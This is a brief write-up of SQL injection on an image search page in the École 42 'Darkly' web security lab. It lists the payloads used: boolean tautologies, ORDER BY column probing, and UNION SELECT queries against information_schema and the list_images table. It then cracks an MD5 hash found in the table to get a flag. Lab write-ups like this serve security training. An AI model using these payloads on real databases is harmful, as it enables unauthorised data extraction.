# Darkly - École 42

## 13. SQL Injection - Image

'''
1 or true
1 or true ORDER BY 1--
1 or true ORDER BY 2--
1 or true ORDER BY 3--
1 UNION all SELECT table_name, column_name FROM information_schema.columns
'''

```
ID: 1 UNION all SELECT table_name, column_name FROM information_schema.columns
Url : list_images

Title: id
Title: url
Title: title
Title: comment
```

-`1 UNION SELECT id, concat(url, title, comment) FROM list_images`

`borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

`1928e8083cf461a51303633093573c46` (MD5) ==> `albatroz`

- `1 UNION SELECT id, concat(comment ,title) FROM list_images WHERE id=5`

- `echo -n "albatroz" | sha256sum`
